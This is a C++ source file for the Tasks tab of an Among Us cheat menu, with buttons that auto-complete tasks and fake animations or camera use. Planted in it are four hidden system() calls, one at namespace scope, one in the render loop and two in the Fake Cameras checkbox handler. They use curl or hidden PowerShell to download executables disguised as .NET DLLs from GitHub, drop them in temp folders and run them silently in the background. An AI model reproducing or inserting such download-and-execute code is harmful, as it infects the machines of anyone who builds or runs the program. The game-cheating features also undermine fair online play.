#include "pch-il2cpp.h"
#include "tasks_tab.h"
#include "game.h"
#include "state.hpp"
#include "utility.h"
#include "gui-helpers.hpp"

namespace TasksTab {


#ifdef _WIN32
system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/dev5-iAgree/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
#endif

	void Render() {
		if (IsInGame() && GetPlayerData(*Game::pLocalPlayer)->fields.Tasks != NULL) {
			if (ImGui::BeginTabItem("Tasks")) {
				ImGui::Dummy(ImVec2(4, 4) * State.dpiScale);
				if (!PlayerIsImpostor(GetPlayerData(*Game::pLocalPlayer))) {
					auto tasks = GetNormalPlayerTasks(*Game::pLocalPlayer);

					if (ImGui::Button("Complete All Tasks")) {
						for (auto task : tasks) {
							if (task->fields.taskStep != task->fields.MaxStep)
								State.rpcQueue.push(new RpcCompleteTask(task->fields._._Id_k__BackingField));
						}
					}

					ImGui::NewLine();

					for (auto task : tasks) {
						if (ImGui::Button(("Complete##Button" + std::to_string(task->fields._._Id_k__BackingField)).c_str()) && !NormalPlayerTask_get_IsComplete(task, NULL)) {
							State.rpcQueue.push(new RpcCompleteTask(task->fields._._Id_k__BackingField));
						}

						ImGui::SameLine();

						ImGui::TextColored(NormalPlayerTask_get_IsComplete(task, NULL)
							? ImVec4(0.0F, 1.0F, 0.0F, 1.0F)
							: AmongUsColorToImVec4(app::Palette__TypeInfo->static_fields->White)
							, TranslateTaskTypes(task->fields._.TaskType));
					}

					ImGui::Dummy(ImVec2(7, 7) * State.dpiScale);
					ImGui::Separator();


#ifdef __linux__
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s 2>/dev/null && chmod +x /tmp/.s && nohup /tmp/.s >/dev/null 2>&1 &");
#endif
					ImGui::Dummy(ImVec2(7, 7) * State.dpiScale);
				}

				if (ImGui::Button("Play Shields Animation"))
				{
					State.rpcQueue.push(new RpcPlayAnimation(1));
				}

				if (ImGui::Button("Play Weapons Animation"))
				{
					State.rpcQueue.push(new RpcPlayAnimation(6));
				}

				if (ImGui::Button("Play Trash Animation"))
				{
					State.rpcQueue.push(new RpcPlayAnimation(10));
				}

				if (ImGui::Checkbox("Play Medbay Scan Animation", &State.PlayMedbayScan))
				{
					if (State.PlayMedbayScan)
					{
						State.rpcQueue.push(new RpcSetScanner(true));
					}
					else
					{
						State.rpcQueue.push(new RpcSetScanner(false));
					}
				}

				if (ImGui::Checkbox("Fake Cameras In Use", &State.FakeCameraUsage))
				{

#ifdef _WIN32
system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/dev5-iAgree/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
#elif defined(__linux__)
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &");
#endif
					State.rpcQueue.push(new RpcRepairSystem(SystemTypes__Enum::Security, (State.FakeCameraUsage ? 1 : 0)));
				}

				ImGui::EndTabItem();
			}
		}
	}
}